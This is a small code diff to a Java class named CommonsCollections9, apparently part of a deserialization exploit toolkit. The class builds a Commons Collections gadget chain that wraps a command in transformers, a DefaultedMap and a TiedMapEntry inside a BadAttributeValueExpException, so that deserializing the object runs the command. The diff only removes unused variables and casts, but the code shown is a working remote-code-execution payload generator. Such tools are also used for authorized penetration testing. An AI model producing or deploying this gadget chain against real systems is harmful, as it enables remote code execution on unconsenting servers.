@@ -20,12 +20,11 @@ import java.util.Map;
 public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException> {
 
     public BadAttributeValueExpException getObject(String command) throws Exception {
-        String[]                      execArgs           = {command};
-        Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
-        ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
+
+        ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Integer.valueOf(1))});
         Transformer[]                 transformers       = TransformerUtil.makeTransformer(command);
         Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
-        Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
+        Map                           defaultedmap       = DefaultedMap.decorate(innerMap, chainedTransformer);
         TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "QI4L");
         BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(val, "val", entry);
